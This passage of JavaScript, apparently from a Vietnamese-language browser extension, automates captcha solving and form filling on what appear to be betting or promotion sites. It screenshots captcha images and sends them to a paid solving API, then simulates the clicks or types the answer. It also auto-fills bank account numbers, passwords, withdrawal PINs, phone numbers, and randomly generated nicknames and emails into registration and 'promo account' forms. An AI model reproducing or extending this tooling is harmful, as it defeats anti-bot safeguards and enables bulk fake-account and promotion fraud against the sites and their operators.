    if (parent.querySelector(`[data-mk-btn="${id}"]`)) return;
    document.querySelectorAll(`[data-mk-btn="${id}"]`).forEach(b => b.remove());
    if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
    const btn = document.createElement("button");
    btn.type = "button"; btn.textContent = label;
    btn.setAttribute('data-mk-btn', id);
    btn.style.cssText = `position:absolute;right:8px;top:50%;transform:translateY(-50%);z-index:9999;padding:4px 10px;background:${color};color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:bold;cursor:pointer;touch-action:manipulation;`;
    btn.onclick = handler;
    parent.appendChild(btn);
  }

  // =====================================================
  // LOAD HTML2CANVAS
  // =====================================================

  function loadHtml2Canvas(){
    return new Promise((resolve, reject) => {
      if(window.html2canvas){ resolve(window.html2canvas); return; }
      const s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
      s.onload  = () => resolve(window.html2canvas);
      s.onerror = () => reject(new Error('html2canvas load failed'));
      document.head.appendChild(s);
    });
  }

  function findBotionContainer(){
    const tipEl =
      document.querySelector('[class*="botion_text_tips"]') ||
      document.querySelector('[class*="botion"]') ||
      [...document.querySelectorAll('*')].find(el =>
        el.childNodes && [...el.childNodes].some(n =>
          n.textContent?.trim().includes('Chọn theo thứ tự')
        )
      );
    if(!tipEl) return null;
    let el = tipEl;
    for(let i = 0; i < 8; i++){
      if(!el.parentElement) break;
      el = el.parentElement;
      if(el.offsetWidth > 200 && el.offsetHeight > 200) return el;
    }
    return tipEl.parentElement || tipEl;
  }

  function findBotionImage(){
    const container = findBotionContainer();
    if(!container) return null;
    const canvas = container.querySelector('canvas');
    if(canvas && canvas.width > 50) return canvas;
    const imgs = [...container.querySelectorAll('img')]
      .sort((a,b) => (b.offsetWidth*b.offsetHeight)-(a.offsetWidth*a.offsetHeight));
    if(imgs.length) return imgs[0];
    return null;
  }

  function findBotionClickArea(){
    const container = findBotionContainer();
    if(!container) return null;
    const imgArea =
      container.querySelector('[class*="botion_img"]') ||
      container.querySelector('[class*="botion_body"]') ||
      container.querySelector('[class*="botion_click"]') ||
      container.querySelector('canvas') ||
      container.querySelector('img');
    return imgArea || container;
  }

  async function fetchImageBase64(src){
    try{
      const resp = await fetch(src, {mode:'cors'});
      const blob = await resp.blob();
      return new Promise(resolve => {
        const r = new FileReader();
        r.onloadend = () => resolve(r.result.split(',')[1]);
        r.onerror   = () => resolve(null);
        r.readAsDataURL(blob);
      });
    }catch(e){ return null; }
  }

  async function captureElement(el){
    try{
      const h2c = await loadHtml2Canvas();
      const canvas = await h2c(el, {
        useCORS: true, allowTaint: true, scale: 1,
        foreignObjectRendering: false,
      });
      return canvas.toDataURL('image/png').split(',')[1];
    }catch(e){ return null; }
  }

  async function getBase64ForCaptcha(){
    const botionImg = findBotionImage();
    if(botionImg){
      if(botionImg.tagName === 'CANVAS'){
        try{
          const b64 = botionImg.toDataURL('image/png').split(',')[1];
          if(b64 && b64.length > 100) return b64;
        }catch(e){}
      }
      if(botionImg.tagName === 'IMG' && botionImg.src){
        const b64 = await fetchImageBase64(botionImg.src);
        if(b64) return b64;
      }
    }
    const canvases = [...document.querySelectorAll('canvas')]
      .filter(c => c.width > 100 && c.offsetParent)
      .sort((a,b) => (b.width*b.height)-(a.width*a.height));
    if(canvases.length){
      try{
        const b64 = canvases[0].toDataURL('image/png').split(',')[1];
        if(b64 && b64.length > 100) return b64;
      }catch(e){}
    }
    const container = findBotionContainer();
    if(container){
      const b64 = await captureElement(container);
      if(b64) return b64;
    }
    try{
      const h2c = await loadHtml2Canvas();
      const myBtns = [...document.querySelectorAll('[id^="okvip-"]')];
      myBtns.forEach(b => b.style.visibility = 'hidden');
      const canvas = await h2c(document.body, {
        useCORS: true, allowTaint: true, scale: 1,
        x: window.scrollX, y: window.scrollY,
        width: window.innerWidth, height: window.innerHeight,
      });
      myBtns.forEach(b => b.style.visibility = '');
      return canvas.toDataURL('image/png').split(',')[1];
    }catch(e){
      document.querySelectorAll('[id^="okvip-"]').forEach(b => b.style.visibility = '');
      return null;
    }
  }

  async function solveCaptcha(base64, type){
    const apiKey = await mkStorageGet(CAPTCHA_KEY_STORE_NAME);
    const resp = await fetch(ANTICAPTCHA_API, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ apikey: apiKey, img: base64, type })
    });
    return resp.json();
  }

  async function executeSolution(captchaText){
    if(!captchaText) return false;
    const text = captchaText.trim();
    const coords = [];
    const re = /(\d+)\s*,\s*(\d+)/g;
    let m;
    while((m = re.exec(text)) !== null) coords.push({x:+m[1], y:+m[2]});
    if(coords.length > 0){
      showToast(`🎯 Click ${coords.length} điểm...`, 'info');
      const clickArea = findBotionClickArea();
      const rect = clickArea ? clickArea.getBoundingClientRect() : {left:0, top:0};
      for(const {x, y} of coords){
        const areaW = clickArea?.offsetWidth || window.innerWidth;
        const areaH = clickArea?.offsetHeight || window.innerHeight;
        let absX, absY;
        if(x < areaW && y < areaH){ absX = rect.left + x; absY = rect.top  + y; }
        else { absX = x; absY = y; }
        const el = document.elementFromPoint(absX, absY) || document.body;
        ['mousedown','mouseup','click'].forEach(ev =>
          el.dispatchEvent(new MouseEvent(ev, {bubbles:true, clientX:absX, clientY:absY}))
        );
        await new Promise(r => setTimeout(r, 700));
      }
      return true;
    }
    const inp = findOtpInput();
    if(inp){ fillInput(inp, text); return true; }
    showToast(`📋 Kết quả: ${text}`, 'info');
    return false;
  }

  async function handleSolveCaptcha(){
    const btn = document.querySelector('[data-mk-btn="okvip-btn-captcha"]');
    if(btn){ btn.textContent = '⏳ Xử lý...'; btn.disabled = true; btn.style.background = '#6c757d'; }
    try{
      showToast('📸 Chụp ảnh captcha...', 'info');
      const base64 = await getBase64ForCaptcha();
      if(!base64){ showToast('❌ Không chụp được ảnh', 'error'); resetCaptchaBtn(); return; }
      showToast('🤖 Đang gửi giải...', 'info');
      let result = await solveCaptcha(base64, 51);
      if(!result?.success) result = await solveCaptcha(base64, 14);
      if(!result?.success){ showToast(`❌ ${result?.message || 'Lỗi API'}`, 'error'); resetCaptchaBtn(); return; }
      showToast(`✅ ${result.captcha}`, 'success');
      await executeSolution(result.captcha);
    }catch(e){ showToast('❌ Lỗi: ' + e.message, 'error'); }
    resetCaptchaBtn();
  }

  function resetCaptchaBtn(){
    const btn = document.querySelector('[data-mk-btn="okvip-btn-captcha"]');
    if(!btn) return;
    btn.textContent = '🔓 Giải';
    btn.style.background = '#8b5cf6';
    btn.disabled = false;
  }

  function injectCaptchaBtn(){
    const allCaptchaInputs = [...document.querySelectorAll('input')].filter(el =>
      /nhập.*captcha|captcha|xác minh|xac minh|verify/i.test(el.placeholder || '') ||
      ['captcha-input'].includes(el.id) ||
      ['checkCode','captcha','verifyCode'].includes(el.getAttribute('formcontrolname')) ||
      el.classList.contains('captcha') ||
      el.getAttribute('name') === 'identifying'
    );

    for (const checkInput of allCaptchaInputs) {
      if (checkInput.dataset.mkCaptchaInjected) continue;
      if (checkInput.closest('[id^="__mk_captcha_wrap"]')) continue;
      checkInput.dataset.mkCaptchaInjected = '1';

      try {

      const btn = document.createElement('button');
      btn.type = 'button';
      btn.textContent = '🔓 Giải';

      {
        let rowEl = checkInput.parentElement;
        for (let _i = 0; _i < 5 && rowEl; _i++) {
          const _cs = getComputedStyle(rowEl);
          const _w = rowEl.offsetWidth;
          if (_w > 100 && (_cs.display === 'flex' || _cs.display === 'block' || _cs.display === 'grid')) break;
          rowEl = rowEl.parentElement;
        }
        if (!rowEl) rowEl = checkInput.parentElement;
        checkInput.style.removeProperty('padding-right');
        Object.assign(btn.style, {
          display:'block',
          width: rowEl.offsetWidth > 0 ? rowEl.offsetWidth + 'px' : '100%',
          maxWidth:'100%', boxSizing:'border-box',
          background:'linear-gradient(135deg,#8b5cf6,#6d28d9)', color:'#fff',
          border:'none', borderRadius:'8px', padding:'10px 0',
          fontWeight:'bold', fontSize:'13px', cursor:'pointer',
          zIndex:'9999', whiteSpace:'nowrap', touchAction:'manipulation',
          boxShadow:'0 2px 8px rgba(109,40,217,0.4)', textAlign:'center',
          marginTop:'6px'
        });
        btn.setAttribute('data-mk-btn', 'okvip-btn-captcha');
        btn.addEventListener('mousedown', e => e.preventDefault());
        rowEl.insertAdjacentElement('afterend', btn);
      }

      btn.onclick = async (e) => {
        if (e && !e.isTrusted) return;
        btn.textContent = '⏳...'; btn.disabled = true; btn.style.background = '#6c757d';
        window.__MK_CAPTCHA_SOLVING__ = true;
        try {
          showToast('📸 Đọc mã captcha...', 'info');
          let base64 = null;

          function findNearestCaptchaImg(inputEl, maxSteps) {
            function searchNode(node) {
              if (!node) return null;
              const svg = node.tagName === 'SVG' ? node : node.querySelector('svg');
              if (svg) { const r = svg.getBoundingClientRect(); if (r.width > 20 && r.height > 10) return { type:'svg', el:svg }; }
              const imgs = [...node.querySelectorAll('img, canvas')].filter(el => { const r = el.getBoundingClientRect(); return r.width > 20 && r.height > 10; });
              if (imgs.length) return { type:'img', el: imgs[0] };
              return null;
            }
            const captchaPic = inputEl.closest('.fixed-list, .form-group, .captcha-row, div')?.querySelector('img.captcha-pic, img[class*="captcha"]');
            if (captchaPic) { const r = captchaPic.getBoundingClientRect(); if (r.width > 20 && r.height > 10) return { type:'img', el: captchaPic }; }
            let sib = inputEl.previousElementSibling;
            for (let i = 0; i < 4 && sib; i++) { const found = searchNode(sib); if (found) return found; sib = sib.previousElementSibling; }
            sib = inputEl.nextElementSibling;
            for (let i = 0; i < 4 && sib; i++) { const found = searchNode(sib); if (found) return found; sib = sib.nextElementSibling; }
            let node = inputEl;
            for (let i = 0; i < maxSteps; i++) {
              node = node.parentElement;
              if (!node) break;
              const svg = node.querySelector('svg');
              if (svg) { const r = svg.getBoundingClientRect(); if (r.width > 20 && r.height > 10) return { type:'svg', el:svg }; }
              const imgs = [...node.querySelectorAll('img, canvas')].filter(el => { const r = el.getBoundingClientRect(); return r.width > 20 && r.height > 10 && r.width < 400; });
              if (imgs.length) return { type:'img', el: imgs[0] };
              if (node.offsetWidth > 700) break;
            }
            return null;
          }

          const nearest = findNearestCaptchaImg(checkInput, 5);
          if (nearest?.type === 'svg') {
            try {
              const svgEl = nearest.el;
              const svgStr = new XMLSerializer().serializeToString(svgEl);
              const w = svgEl.getAttribute('width') || svgEl.getBoundingClientRect().width || 150;
              const h = svgEl.getAttribute('height') || svgEl.getBoundingClientRect().height || 50;
              base64 = await new Promise(res => {
                const img = new Image();
                img.onload = () => { const c = document.createElement('canvas'); c.width=w; c.height=h; const ctx=c.getContext('2d'); ctx.fillStyle='#fff'; ctx.fillRect(0,0,w,h); ctx.drawImage(img,0,0); res(c.toDataURL('image/png').split(',')[1]); };
                img.onerror = () => res(null);
                img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgStr);
              });
            } catch(e) {}
          }
          if (!base64 && nearest?.type === 'img') {
            const captchaImgEl = nearest.el;
            if(captchaImgEl) {
              try {
                function _b64ToUint8(b64) { const bin=atob(b64);const arr=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);return arr; }
                function _b64ToBlob(b64,mime){return new Blob([_b64ToUint8(b64)],{type:mime||'application/octet-stream'});}
                function _textToBlob(txt,mime){return new Blob([txt],{type:mime||'text/plain'});}
                function _extractDataUri(src){const m=src.match(/^data:([^;]+)(;charset=[^;]+)?(;base64)?,(.*)$/s);if(!m)return null;return{mime:m[1]||'',isBase64:!!m[3],data:m[4]||''};}
                function _objUrlToPng(url,w,h){return new Promise((resolve,reject)=>{const img=new Image();img.crossOrigin='anonymous';img.onload=()=>{try{const cw=w||img.naturalWidth||img.width||200;const ch=h||img.naturalHeight||img.height||80;const c=document.createElement('canvas');c.width=cw;c.height=ch;const ctx=c.getContext('2d');ctx.fillStyle='#ffffff';ctx.fillRect(0,0,cw,ch);ctx.drawImage(img,0,0,cw,ch);const b64=c.toDataURL('image/png').split(',')[1];resolve(b64);}catch(e){reject(e);}};img.onerror=e=>reject(new Error('img load error'));img.src=url;});}
                const src=captchaImgEl.src||captchaImgEl.getAttribute('src')||'';
                if(src){
                  if(src.startsWith('data:')){
                    const parsed=_extractDataUri(src);
                    if(parsed){
                      const{mime,isBase64,data}=parsed;
                      if(mime==='image/svg+xml'||mime==='image/svg'){
                        const svgText=isBase64?atob(data):decodeURIComponent(data);
                        const blob=_textToBlob(svgText,'image/svg+xml;charset=utf-8');
                        const url=URL.createObjectURL(blob);
                        try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                      }else{
                        const blob=_b64ToBlob(data,mime||'image/png');
                        const url=URL.createObjectURL(blob);
                        try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                      }
                    }
                  }else{
                    const resp=await fetch(src,{mode:'cors'});
                    const mime=resp.headers.get('content-type')||'';
                    const ab=await resp.arrayBuffer();
                    const b64=btoa(String.fromCharCode(...new Uint8Array(ab)));
                    if(mime.includes('svg')){
                      const svgText=atob(b64);
                      const blob=_textToBlob(svgText,'image/svg+xml;charset=utf-8');
                      const url=URL.createObjectURL(blob);
                      try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                    }else{
                      const blob=_b64ToBlob(b64,mime||'image/png');
                      const url=URL.createObjectURL(blob);
                      try{base64=await _objUrlToPng(url);}finally{URL.revokeObjectURL(url);}
                    }
                  }
                }
              } catch(e){}
            }
          }
          if(!base64) base64 = await getBase64ForCaptcha();
          if(!base64) { showToast('❌ Không chụp được ảnh','error'); window.__MK_CAPTCHA_SOLVING__=false; btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false; return; }
          showToast('🤖 Đang nhận dạng...','info');
          let result = await solveCaptcha(base64, 1);
          if(!result?.success) result = await solveCaptcha(base64, 14);
          if(!result?.success) { showToast('❌ '+(result?.message||'Lỗi'),'error'); window.__MK_CAPTCHA_SOLVING__=false; btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false; return; }
          showToast('✅ '+result.captcha,'success');
          const _val = result.captcha.trim();
          const _setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value')?.set;
          if(_setter) _setter.call(checkInput,_val); else checkInput.value=_val;
          checkInput.dispatchEvent(new Event('input',{bubbles:true}));
        } catch(e) { showToast('❌ '+e.message,'error'); }
        btn.textContent='🔓 Giải'; btn.style.background='#8b5cf6'; btn.disabled=false;
        setTimeout(()=>{window.__MK_CAPTCHA_SOLVING__=false;},3000);
      };

      } catch(e) {
        console.warn('[MK] lỗi khi gắn nút captcha cho input', checkInput, e);
        checkInput.dataset.mkCaptchaInjected = '';
      }
    }
  }

  function injectTKKMBtn() {
    if(document.getElementById('okvip-btn-tkkm')?.isConnected) return;
    let targetInput = null;
    const byIdAccount = document.querySelector('input[type="text"]#account.background-input-select');
    if(byIdAccount) { targetInput = byIdAccount; }
    if(!targetInput) { const byId = document.getElementById('account'); if(byId && byId.tagName === 'INPUT') targetInput = byId; }
    if(!targetInput) {
      const byAC = [...document.querySelectorAll('input[autocomplete="username"]')].find(el => el.offsetParent !== null && el.offsetWidth > 0);
      if(byAC) targetInput = byAC;
    }
    if(!targetInput) {
      targetInput = [...document.querySelectorAll('input[type="text"], input:not([type])')].find(el =>
        /tên tài khoản|ten tai khoan|tên tk|tài khoản/i.test(el.placeholder || "") &&
        el.offsetParent !== null && el.offsetWidth > 0 && el.offsetHeight > 0 &&
        el.getAttribute("data-input-name") !== "account" && el.getAttribute("data-input-name") !== "username" &&
        el.getAttribute("name") !== "username" && el.getAttribute("formcontrolname") !== "account"
      ) || null;
    }
    if(!targetInput) {
      const allTitleDivs = [...document.querySelectorAll('div.title-form')];
      const promoTitle = allTitleDivs.find(el => el.textContent.trim().includes('Thông tin khuyến mãi'));
      if(!promoTitle) return;
      const container = promoTitle.closest('form, [class*="form"], div[class*="box"], div[class*="wrap"], section') || promoTitle.parentElement?.parentElement;
      let accountTitle = null;
      if(container) { accountTitle = [...container.querySelectorAll('div.title-form')].find(el => el.textContent.trim().includes('Tên tài khoản')); }
      if(!accountTitle) { accountTitle = allTitleDivs.find(el => el.textContent.trim().includes('Tên tài khoản')); }
      if(!accountTitle) return;
      const inputContainer = accountTitle.closest('div') || accountTitle.parentElement;
      targetInput = inputContainer?.querySelector('input[type="text"], input') ||
        accountTitle.nextElementSibling?.querySelector('input') ||
        accountTitle.parentElement?.querySelector('input');
    }
    if(!targetInput) return;
    if (targetInput.closest('[data-mk-stk-wrap]') || targetInput.closest('.mc-account-list') ||
        targetInput.getAttribute('name') === 'bankCard' ||
        /số tài khoản ngân hàng|so tai khoan ngan hang|nhập số tài khoản/i.test(targetInput.placeholder || '')) return;

    const btn = document.createElement('button');
    btn.id = 'okvip-btn-tkkm'; btn.type = 'button'; btn.textContent = '🆔 Điền TKKM';
    const alreadyWrapped = targetInput.closest('#__mk_tkkm_wrap__');
    if (!alreadyWrapped) {
      const wrap = document.createElement('div'); wrap.id = '__mk_tkkm_wrap__';
      wrap.style.cssText = 'position:relative;display:block;width:100%;';
      targetInput.parentNode.insertBefore(wrap, targetInput); wrap.appendChild(targetInput);
      let _node = wrap.parentElement;
      for(let _i = 0; _i < 6; _i++) {
        if(!_node) break;
        const _cs = getComputedStyle(_node);
        if(_cs.overflow === 'hidden' || _cs.overflow === 'clip') _node.style.overflow = 'visible';
        if(_cs.overflowY === 'hidden') _node.style.overflowY = 'visible';
        _node = _node.parentElement;
      }
    }
    targetInput.style.setProperty('padding-right', '130px', 'important');
    btn.style.cssText = 'position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#1a73e8;color:#fff;border:none;border-radius:6px;padding:6px 10px;cursor:pointer;font-weight:700;font-size:12px;z-index:2147483640;white-space:nowrap;touch-action:manipulation;';
    btn.addEventListener('mousedown', e => e.preventDefault());
    btn.onclick = async (e) => {
      if (e && !e.isTrusted) return;
      let savedNick = '';
      try { savedNick = localStorage.getItem('okvip_hard_username') || ''; } catch(e) {}
      if (!savedNick) { try { const res = await new Promise(resolve => chrome.storage.local.get(['okvip_hard_username'], resolve)); savedNick = res['okvip_hard_username'] || ''; } catch(e) {} }
      if (!savedNick) { try { savedNick = window.__OKVIP_okvip_last_username__ || ''; } catch(e) {} }
      if (!savedNick) { try { const res = await new Promise(resolve => chrome.storage.local.get(['okvip_last_username'], resolve)); savedNick = res['okvip_last_username'] || ''; } catch(e) {} }
      if (!savedNick) savedNick = localStorage.getItem(LAST_USERNAME_KEY) || '';
      if(!savedNick) { showToast('⚠️ Chưa có TK nào được lưu', 'error'); return; }
      btn.textContent = '⌨️...'; btn.disabled = true;
      await typeIntoInput(targetInput, savedNick);
      btn.textContent = `✅ ${savedNick}`; btn.style.background = '#2e7d32';
      showToast('🆔 TKKM: ' + savedNick, 'success');
      setTimeout(() => { btn.textContent = '🆔 Điền TKKM'; btn.style.background = '#1a73e8'; btn.disabled = false; }, 2000);
    };
    const wrapEl = targetInput.closest('#__mk_tkkm_wrap__') || targetInput.parentElement;
    wrapEl.appendChild(btn);
  }

  function tryInjectAll() {
    injectBankBtn(getPasswordInput, "__mk_fill_btn__", "__mk_wrapper__", "🔑 Điền MK", "#f60", async (btn) => {
      btn.textContent = "⌨️..."; btn.disabled = true;
      let t = document.querySelector("#__mk_wrapper__ input[type='password']") ||
              document.querySelector("#__mk_wrapper__ input") || getPasswordInput();
      if (!t) { showToast("❌ Không tìm thấy ô mật khẩu", "error"); btn.innerHTML = "🔑 Điền MK"; btn.style.background = "#f60"; btn.disabled = false; return; }
      const pw = getPassword();
      if (!pw) { showToast("⚠️ Chưa có mật khẩu — kiểm tra cấu hình", "error"); btn.innerHTML = "🔑 Điền MK"; btn.style.background = "#f60"; btn.disabled = false; return; }
      await typeIntoInput(t, pw);
      await sleep(150);
      const confirmEl = getConfirmPasswordInput();
      if (confirmEl && confirmEl !== t) await typeIntoInput(confirmEl, pw);
      await sleep(100);
      if (!t.value) { t = getPasswordInput(); if (t) await typeIntoInput(t, pw); }
      btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
      showToast("🔑 Đã điền mật khẩu", "success");
      setTimeout(() => { btn.innerHTML = "🔑 Điền MK"; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
    });

    (function injectWithdrawPw() {
      const wdInputs = getWithdrawInputs();
      wdInputs.forEach((el, idx) => {
        const btnId = `__mk_wdpw_btn_${idx}__`;
        if (document.getElementById(btnId)) return;
        if (el.closest(`#__mk_wdpw_wrap_${idx}__`)) return;
        const parent = el.parentElement;
        if (!parent) return;
        if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
        el.style.paddingRight = "110px"; el.style.boxSizing = "border-box";
        const btn = document.createElement("button");
        btn.id = btnId; btn.type = "button"; btn.innerHTML = "🔒 MK Rút";
        btn.style.cssText = "position:absolute;right:36px;top:50%;transform:translateY(-50%);background:#e91e63;color:#fff;border:none;border-radius:6px;padding:5px 8px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
        btn.addEventListener("mousedown", e => e.preventDefault());
        btn.addEventListener("click", async () => {
          btn.textContent = "⌨️..."; btn.disabled = true;
          clickEyeIcon(el); await sleep(150);
          await typeIntoInput(el, getWithdrawPassword());
          btn.textContent = "✅"; btn.style.background = "#2e7d32";
          setTimeout(() => { btn.innerHTML = "🔒 MK Rút"; btn.style.background = "#e91e63"; btn.disabled = false; }, 1500);
        });
        parent.appendChild(btn);
      });
    })();

    injectBankBtn(getNameInput, "__mk_name_btn__", "__mk_name_wrapper__", "👤 Điền Tên", "#f60", async (btn) => {
      await showPicker(async (account) => {
        setLastAccount(account);
        btn.textContent = "⌨️..."; btn.disabled = true;
        await typeIntoInput(getNameInput(), account.name);
        try { chrome.storage.local.set({[LAST_NAME_KEY]: account.name}); } catch(e) {}
        await sleep(200);
        const emailEl2 = getEmailInput();
        if (emailEl2) {
          const emailOpts = await genEmailOptions(account.name);
          const emailPick = emailOpts[Math.floor(Math.random() * emailOpts.length)];
          await typeIntoInput(emailEl2, emailPick.value);
        }
        await sleep(200);
        let hardUser3 = "";
        try { hardUser3 = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUser3) { try { hardUser3 = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        const userEl = getUsernameInput();
        if (userEl) {
          let fillVal;
          if (hardUser3) { fillVal = hardUser3; }
          else { const opts = await genNickOptions(account.name); fillVal = opts[Math.floor(Math.random() * opts.length)].value; }
          await typeIntoInput(userEl, fillVal);
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: fillVal}); } catch(e) {}
          showToast((hardUser3 ? "🆔 TK: " : "🎲 TK: ") + fillVal, "info");
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, fillVal);
        } else {
          const fallbackEl = document.querySelector('input[data-input-name="account"]');
          if (fallbackEl) {
            let fillVal;
            if (hardUser3) { fillVal = hardUser3; }
            else { const opts = await genNickOptions(account.name); fillVal = opts[Math.floor(Math.random() * opts.length)].value; }
            fallbackEl.focus();
            const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            setter.call(fallbackEl, fillVal);
            ['input','change'].forEach(ev => fallbackEl.dispatchEvent(new Event(ev, {bubbles:true})));
            showToast((hardUser3 ? "🆔 TK: " : "🎲 TK: ") + fillVal, "info");
          }
        }
        await sleep(200);
        const stkEl2 = getStkInput();
        if (stkEl2) {
          const okStk2 = await fillStkVerified(account.account);
          showToast(okStk2 ? ("💳 STK: " + account.account) : "⚠️ STK điền sai, đã thử lại", "info");
        }
        await sleep(300);
        const sdtBtn = document.querySelector('[data-mk-btn="okvip-btn-phone"]');
        if (sdtBtn) {
          sdtBtn.click();
          await new Promise(resolve => {
            let waited = 0;
            const check = setInterval(() => {
              waited += 500;
              const txt = document.querySelector('[data-mk-btn="okvip-btn-phone"]')?.textContent || "";
              const done = txt.includes("✅") || txt.includes("❌") || txt.includes("Hết") || waited >= 1000;
              if (done) { clearInterval(check); resolve(); }
            }, 500);
          });
        }
        await sleep(400);
        const mkBtn = document.getElementById("__mk_fill_btn__");
        if (mkBtn) { mkBtn.click(); await sleep(1500); }
        else { const pwEl = getPasswordInput(); if (pwEl) await typeIntoInput(pwEl, getPassword()); }
        await sleep(300);
        let _hardPhone4 = "";
        try { _hardPhone4 = localStorage.getItem("okvip_hard_phone") || ""; } catch(e) {}
        if (!_hardPhone4) { try { _hardPhone4 = await new Promise(res => chrome.storage.local.get(["okvip_hard_phone"], s => res(s["okvip_hard_phone"] || ""))); } catch(e) {} }
        const _simPhone4 = (() => { try { const s = JSON.parse(localStorage.getItem("okvip_current_sim") || "null"); return s?.phone || ""; } catch(e) { return ""; } })();
        const _phone4 = _hardPhone4 || _simPhone4 || "";
        let _email4 = "";
        try {
          const _emailEl4 = getEmailInput();
          _email4 = _emailEl4?.value || "";
          if (!_email4 && account.name) { const _opts4 = await genEmailOptions(account.name); _email4 = _opts4[Math.floor(Math.random() * _opts4.length)].value; }
        } catch(e) {}
        const _fillUser4 = (() => { try { return localStorage.getItem("okvip_hard_username") || ""; } catch(e) { return ""; } })() || account.name;
        await bulkFillForm([account.name, account.account, account.tag || "", "", _fillUser4, getPassword(), getWithdrawPassword(), _phone4, _email4, ""]);
        btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
        setTimeout(() => { btn.innerHTML = "👤 Điền Tên"; btn.style.background = "#f60"; btn.disabled = false; }, 2000);
      });
    });

    (function injectStk() {
      if (document.getElementById("__mk_stk_btn__")) return;
      const stkEl = getStkInput();
      if (!stkEl) return;
      if (isWithdrawInput(stkEl)) return;
      if (/tên|ten|username/i.test(stkEl.placeholder || "")) return;
      const existingWrap = stkEl.closest("#__mk_stk_wrapper__");
      if (existingWrap) return;
      const parent = stkEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.dataset.mkStkWrap = "1";
      stkEl.style.setProperty("padding-right", "120px", "important");
      stkEl.style.boxSizing = "border-box";
      const btn = document.createElement("button");
      btn.id = "__mk_stk_btn__"; btn.type = "button";
      btn.innerHTML = MK.state.lastSelectedAccount ? `💳 ${MK.state.lastSelectedAccount.name.split(" ").pop()}` : "💳 Điền STK";
      btn.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f60;color:#fff;border:none;border-radius:6px;padding:6px 10px;cursor:pointer;font-weight:700;font-size:12px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btn.addEventListener("mousedown", e => e.preventDefault());
      btn.addEventListener("click", async () => {
        if (!MK.state.lastSelectedAccount) {
          await showPicker(async (account) => {
            setLastAccount(account);
            btn.textContent = "⌨️..."; btn.disabled = true;
            const ok = await fillStkVerified(account.account);
            btn.textContent = ok ? "✅ Xong" : "⚠️ Sai STK"; btn.style.background = ok ? "#2e7d32" : "#c62828";
            setTimeout(() => { btn.innerHTML = "💳 Điền STK"; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
          });
        } else {
          btn.textContent = "⌨️..."; btn.disabled = true;
          const ok = await fillStkVerified(MK.state.lastSelectedAccount.account);
          if (ok) { try { chrome.storage.local.set({[LAST_STK_KEY]: MK.state.lastSelectedAccount.account}); } catch(e) {} }
          btn.textContent = ok ? `✅ ${MK.state.lastSelectedAccount.name}` : "⚠️ Sai STK"; btn.style.background = ok ? "#2e7d32" : "#c62828";
          setTimeout(() => { btn.innerHTML = `💳 ${MK.state.lastSelectedAccount.name.split(" ").pop()}`; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
        }
      });
      let holdTimer = null;
      btn.addEventListener("touchstart", () => {
        holdTimer = setTimeout(async () => {
          await showPicker(async (account) => {
            setLastAccount(account);
            btn.textContent = "⌨️..."; btn.disabled = true;
            const ok = await fillStkVerified(account.account);
            btn.textContent = ok ? "✅ Xong" : "⚠️ Sai STK"; btn.style.background = ok ? "#2e7d32" : "#c62828";
            setTimeout(() => { btn.innerHTML = `💳 ${account.name.split(" ").pop()}`; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
          });
        }, 600);
      }, { passive: true });
      btn.addEventListener("touchend", () => clearTimeout(holdTimer), { passive: true });
      parent.appendChild(btn);
    })();

    const _isPromoPage = (
      [...document.querySelectorAll('div.title-form')].some(el => el.textContent.trim().includes('Thông tin khuyến mãi')) ||
      [...document.querySelectorAll('h1,h2,h3,div,p,span')].some(el => /trung tâm khuyến mãi|trung tam khuyen mai|nhập tên tài khoản|nhap ten tai khoan/i.test(el.textContent || ""))
    );

    (function injectUsernameBtn() {
      if (document.getElementById("__mk_user_btn__")) return;
      if (_isPromoPage) return;
      if (document.getElementById("okvip-btn-tkkm")) return;
      const _isWithdrawPage = !!(
        document.querySelector('input[formcontrolname="newPassword"]') || document.querySelector('input[formcontrolname="oldPassword"]') ||
        [...document.querySelectorAll('div,h2,h3,span,p')].some(el => /mã pin rút tiền|ma pin rut tien|đổi mật khẩu rút|doi mat khau rut/i.test(el.textContent||""))
      );
      if (_isWithdrawPage) return;
      const userEl = getUsernameInput();
      if (!userEl) return;
      if (userEl.closest("#__mk_user_wrap__")) return;
      const wrap = document.createElement("div"); wrap.id = "__mk_user_wrap__";
      wrap.style.cssText = "position:relative;display:block;width:100%;";
      userEl.parentNode.insertBefore(wrap, userEl); wrap.appendChild(userEl);
      userEl.style.setProperty("padding-right", "170px", "important");
      const mkBtn = (id, html, bg) => {
        const b = document.createElement("button"); b.id = id; b.type = "button"; b.innerHTML = html;
